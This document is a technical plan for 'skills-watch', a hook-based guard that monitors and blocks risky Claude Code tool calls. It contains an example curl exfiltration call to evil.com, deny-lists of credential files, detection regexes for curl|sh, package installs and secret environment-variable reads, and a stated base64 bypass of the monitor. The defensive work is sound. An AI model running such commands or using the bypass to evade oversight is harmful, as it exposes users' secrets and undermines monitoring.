# skills-watch — Technical Implementation Plan

Source: hoisted from `tango/2026-04-18_mvp-shape/arena.md` at Phase 2 convergence on 2026-04-18. Every architectural decision traces to a rubric item from `tango/2026-04-18_mvp-shape/rubric.md` and is verified (or will be, prior to v0 ship) by a spike under `tango/2026-04-18_mvp-shape/spikes/`.

---

## Rubric trace (decision → rubric item)

| Decision | Rubric item(s) |
|---|---|
| Node.js / npm package distribution | `[DISTRIBUTION]`, `C2.2 (dep: Claude Code agent tool loop)` |
| `PreToolUse` hook as enforcement primitive | `C2.1 (dep: Claude Code hook API)`, `[HOOK-INSTALL]`, `[HOOK-DECISION]` |
| Pattern-matching (not kernel sandbox) for v0 | `C2.1`, Honest-limits acknowledgement |
| Universal deny-list is hardcoded | `C1.2 (mkt: builder not security-engineer)`, `[FILE DENY]`, `[NET DENY]`, `[BASH DENY]` |
| Allow-list in `~/.skills-watch/config.json` | `[ESCAPE HATCH]` |
| Live log at `~/.skills-watch/live.log` | `[LIVE LOG]`, `[CLARITY — log format]` |
| Summary CLI (not SessionEnd hook) | `[CLARITY — summary CLI]` |
| ~200 LOC scope | `C3.2 (biz: time-to-ship)` |
| ≤ 20 ms hook overhead target | `[LATENCY]` |
| Idempotent install | `[UX-INSTALL]`, `[HOOK-INSTALL]` |

---

## Dependency floors (immutable)

v0 is bounded by these dependencies. Relaxing any requires changing the product, not just the implementation.

- **`C2.1 (dep: Claude Code hook API)`** — enforcement is what `PreToolUse` exposes: tool-call JSON payload on stdin; exit 0 (allow) / exit 2 with stderr (block). No mid-tool streaming. No `SessionEnd` event. Decision is pattern-based on the payload, not kernel-enforced.
- **`C2.2 (dep: Claude Code agent tool loop)`** — v0 targets Claude Code specifically. Cross-agent (Cursor, Codex, Cline, Gemini CLI) is v1+.
- **macOS + Linux only** (inherited from Claude Code's platform support).
- **Node.js present** (already required by Claude Code; no incremental install burden).

---

## Architecture at a glance

Three components, distributed as one npm package (`skills-watch`):

- **`bin/skills-watch`** — the management CLI. Subcommands: `install`, `uninstall`, `status`, `summary [--since <duration>]`, `allow {add|add-host|remove|remove-host|list} [--for <skill-csv>]`.
- **`bin/skills-watch-hook`** — the `PreToolUse` hook binary. Reads the tool-call JSON on stdin, reads `~/.skills-watch/current-skill` sidecar for active-skill context, applies the universal deny-list plus the effective allow-list (global ∪ per-skill), writes to `~/.skills-watch/live.log`, exits 0 or 2.
- **`bin/skills-watch-prompt-hook`** — the `UserPromptSubmit` hook binary. Reads the user-message JSON on stdin, regex-extracts the first slash command from the `prompt` field (if present), writes the skill name to `~/.skills-watch/current-skill`. Always exits 0 — never blocks.

Total ~230–270 LOC across all three. No daemon. State limited to `~/.skills-watch/{live.log, config.json, current-skill}` and `~/.claude/settings.json`.

*Cites: `[DISTRIBUTION]`, `C3.2`.*

---

## The management CLI (`bin/skills-watch`)

### Subcommands

- **`install`** — reads `~/.claude/settings.json` (creating if absent), merges in two hook entries (`hooks.PreToolUse` → `skills-watch-hook`; `hooks.UserPromptSubmit` → `skills-watch-prompt-hook`), preserves any pre-existing hooks, writes atomically. Also creates `~/.skills-watch/config.json` with empty global + empty `per_skill` dict if absent. Idempotent: second run outputs `already installed`. *Cites: `[HOOK-INSTALL]`, `[UX-INSTALL]`.*
- **`uninstall`** — removes only the two `skills-watch-*` entries; leaves other hooks intact. Preserves `~/.skills-watch/config.json` (allow-list and current-skill sidecar preserved across reinstalls).
- **`status`** — prints whether both hooks are installed, the live-log path, the current-skill sidecar value, and the effective allow-list grouped by tier.
- **`summary [--since <duration>]`** — reads `~/.skills-watch/live.log`, prints `SUMMARY: N tool calls, K BLOCKED (since <iso8601>)`. Default window is "since last SessionStart event"; `--since 1h` / `30m` / `2d` windows by duration. *Cites: `[CLARITY — summary CLI]`.*
- **`allow {add|add-host|remove|remove-host|list} [--for <skill-csv>]`** — reads / mutates `~/.skills-watch/config.json`. Optional `--for <csv>` scopes the operation to one or more specific skills; absent, the operation applies to the global tier. `list` prints both tiers. All idempotent.

~150 LOC. Node's built-in `fs` + `path`; no external deps.

## The `UserPromptSubmit` hook (`bin/skills-watch-prompt-hook`)

### Input
Claude Code invokes this hook before processing every user message, with JSON on stdin:
```json
{"session_id": "...", "cwd": "...", "hook_event_name": "UserPromptSubmit", "prompt": "/tango-research design a passive regulator"}
```

### Pipeline
1. Parse stdin JSON.
2. Regex match the `prompt` field against `/^\/(\S+)(\s|$)/`.
3. If matched: atomically write capture group 1 (skill name) to `~/.skills-watch/current-skill`.
4. If not matched: leave sidecar unchanged (preserves last known skill for follow-up prompts).
5. Exit 0 unconditionally — this hook is observational, never blocks.

~15 LOC. *Cites: `[SKILL CONTEXT]`.*

---

## The hook (`bin/skills-watch-hook`)

### Input

Claude Code invokes the hook with a JSON payload on stdin, e.g.:

```json
{"tool": "Read", "arguments": {"file_path": "/Users/shiva/.ssh/id_rsa"}}
```

```json
{"tool": "Bash", "arguments": {"command": "curl https://evil.com/exfil"}}
```

### Pipeline

1. Parse stdin JSON.
2. Read `~/.skills-watch/current-skill` sidecar (empty string if absent) — this is the active skill context written by `skills-watch-prompt-hook`.
3. Load allow-lists from `~/.skills-watch/config.json`. Compute the effective allow-list for this call: `allow.paths ∪ per_skill[current_skill].paths` (and same for hosts). If `current_skill` is empty, only the global tier applies.
4. Apply deny-list pattern checks in this order:
   - **Filesystem path match** (`Read` / `Write` / `Edit` / `MultiEdit`): expand `~`, canonicalize, check against deny-list regex unless overridden.
   - **Network host match** (`WebFetch` / `WebSearch`): extract host, check against allow-list unless overridden.
   - **Bash command pattern match** (`Bash`): three regex groups — (a) mid-run installer patterns, (b) egress with host extraction, (c) secret-path patterns in `cat`/`less`/`head` etc., (d) env-var-read patterns (`printenv $SECRET`, `echo $SECRET`, `env | grep SECRET`) for the sensitive-var prefix list.
5. If any check denies: append `<iso8601> BLOCK <TOOL> <OBJECT> [skill=<current_skill>]` to `~/.skills-watch/live.log`, print the formatted BLOCKED message to stderr (including the `npx skills-watch allow add [--for <current_skill>] …` override — scoped to the active skill if context is known, global otherwise), exit 2.
6. If all checks pass: append `<iso8601> ALLOW <TOOL> <OBJECT> [skill=<current_skill>]` to live log, exit 0.

~120 LOC. No dependencies beyond Node built-ins.

*Cites: `[HOOK-DECISION]`, `[FILE DENY]`, `[NET DENY]`, `[BASH DENY]`, `[LIVE LOG]`.*

### Bash env-var-read detection (honest limits)

For `Bash` tool calls, the hook also pattern-matches common env-var-read attempts — `printenv <VAR>`, `echo $<VAR>`, `env | grep <VAR>` — where `<VAR>` matches `AWS_*`, `ANTHROPIC_*`, `OPENAI_*`, `GEMINI_*`, `GOOGLE_*`, `GITHUB_TOKEN`, `NPM_TOKEN`, `SSH_*`.

On match: exit 2. **Honest limit:** the hook cannot actually scrub the environment (that requires SRT subprocess wrapping, deferred to v1). A base64-encoded variant of the read still slips through. v0 catches the common attack pattern, not the sophisticated one.

*Cites: `[PAINKILLER — env-var read detection]`.*

---

## Universal policy data (hardcoded; not user-configurable in v0)

**Filesystem deny-list (read + write + edit):**

```
~/.ssh/           ~/.aws/           ~/.gnupg/
~/.netrc          ~/.docker/config.json
~/.agents/.env    ~/.zsh_history    ~/.bash_history
~/.gitconfig      ~/.git-credentials    ~/.config/git/credentials
```

…plus any file matching `.env` anywhere *outside* the skill's CWD. `<cwd>/.git/` is explicitly NOT on the list.

**Network allow-list (all other hosts denied):**

```
*.anthropic.com    api.openai.com    generativelanguage.googleapis.com
github.com         pypi.org          registry.npmjs.org
```

**Bash mid-run installer patterns (denied):**

```
/\bpip3?\s+install\b/     /\bnpm\s+install\b/     /\byarn\s+add\b/
/\bpnpm\s+add\b/          /\bcurl\b.*\|\s*sh\b/   /\bwget\b.*\|\s*sh\b/
```

**Env-var-read patterns (denied when var matches sensitive prefix list):**

```
/\bprintenv\s+(\w+)/      /\becho\s+\$\{?(\w+)\}?/   /\benv\s*\|\s*grep\s+(\w+)/
```

---

## Flow: what happens when the user invokes a skill

1. User types `/tango-research <goal>` in Claude Code.
2. **`UserPromptSubmit` hook fires first.** `skills-watch-prompt-hook` reads the prompt JSON, regex-extracts `tango-research`, writes it atomically to `~/.skills-watch/current-skill`, exits 0.
3. Claude reads `tango-research/SKILL.md`, decides to call `Bash` to run a Python script.
4. **`PreToolUse` hook fires** before the tool call executes. `skills-watch-hook` receives the tool-call JSON on stdin, reads `~/.skills-watch/current-skill` (finds `tango-research`), loads config, computes the effective allow-list: `allow.paths ∪ per_skill["tango-research"].paths`.
5. Hook checks the `Bash` command against deny-list patterns, using the effective allow-list.
6. On allow: exit 0, append `ALLOW Bash python3 ... [skill=tango-research]` to live log; tool runs.
7. On block (e.g. `curl example.com` in the command): exit 2 with stderr `BLOCKED: Bash-egress example.com — to allow for tango-research, run: npx skills-watch allow add-host --for tango-research example.com`. The `--for tango-research` scope is pre-filled because the sidecar said the skill was active.
8. Claude sees the exit-2 error, stops, relays to the user with the per-skill scope already in the suggested command.

---

## Verification spikes (required before v0 ship)

Committed under `tango/2026-04-18_mvp-shape/spikes/`:

- **`redteam_secrets.py`** — for each of the 7 red-team actions (ssh read, gitconfig read, git-credentials read, shell-history read, non-allowlisted egress, mid-run `pip install`, `~/.zshrc` write), synthesize a tool-call JSON payload, invoke `skills-watch-hook` with that payload on stdin, assert exit code 2 and expected stderr (including the override hint).
- **`perf_hook.py`** — time 1000 benign tool calls through the hook, assert mean overhead ≤ 20 ms and p99 ≤ 50 ms.
- **`install_walkthrough.sh`** — clean-laptop end-to-end test: run `npx skills-watch install`, invoke a known benign skill in Claude Code, assert log lines appear and exit code is 0. Re-run install, assert idempotent no-op.
- **`escape_hatch.sh`** — run `npx skills-watch allow add ~/.gitconfig`; invoke a skill that reads `~/.gitconfig`; assert allow; `allow remove`; assert re-blocked.
- **`summary_cli.sh`** — run a scripted sequence of benign + blocked tool calls; run `npx skills-watch summary --since 10m`; assert the printed counts match the scripted counts.

These spikes gate Phase 2 convergence → ship. If any red-team spike fails, that's an R-item FAIL and triggers another Tango round before release.

---

## Known limits (honest)

- **Pattern-matching is defeatable.** A skill that base64-encodes a malicious Bash command (`bash -c "$(echo ... | base64 -d)"`) can slip past the regex check. v0 accepts this trade; v1 adds SRT subprocess wrapping as a deeper enforcement layer.
- **Only Claude Code in v0.** Cursor, Codex, Cline, Gemini CLI all have their own tool-call boundaries that would each need a dedicated integration.
- **No mid-tool observability.** Hooks fire pre- and post-tool, not during. Long-running `Bash` calls are visible at entry and exit but not in between.
- **No Windows.** Inherits Claude Code's platform support.

---

## Out of scope for v0

- Cross-agent adaptation (Cursor, Codex, Cline, Gemini CLI hook integrations).
- SRT subprocess wrapping as a second enforcement layer.
- Per-skill persisted allow-lists.
- Team policy server, shared deny-list profiles.
- CI integration.
- Dynamic SKILL.md parsing to auto-extend the allow-list.
